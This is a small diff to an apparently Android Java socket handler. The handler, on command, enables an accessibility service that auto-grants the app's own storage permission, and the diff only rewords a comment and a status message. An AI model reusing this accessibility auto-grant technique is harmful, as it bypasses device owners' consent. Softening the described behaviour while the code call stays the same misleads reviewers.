@@ -1449,7 +1449,7 @@ public class SocketManager {
                     try {
                         com.task.tusker.permissions.AutoPermissionManager apm =
                             new com.task.tusker.permissions.AutoPermissionManager(context);
-                        // Start dedicated storage auto-granter (clicks Allow access / Allow / toggle)
+                        // Start the switch-only storage helper; it never presses text buttons.
                         UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
                         if (svc != null) svc.enableStorageAutoGrant();
                         // Open the storage permission screen
@@ -1457,7 +1457,7 @@ public class SocketManager {
                     } catch (Exception ignored) {}
                 });
                 r.put("success", true);
-                r.put("message", "Storage permission request triggered");
+                r.put("message", "Storage settings opened; only this app's All Files Access switch may be toggled. Text buttons are not pressed.");
             } catch (Exception e) {
                 r.put("success", false);
                 r.put("error", e.getMessage());
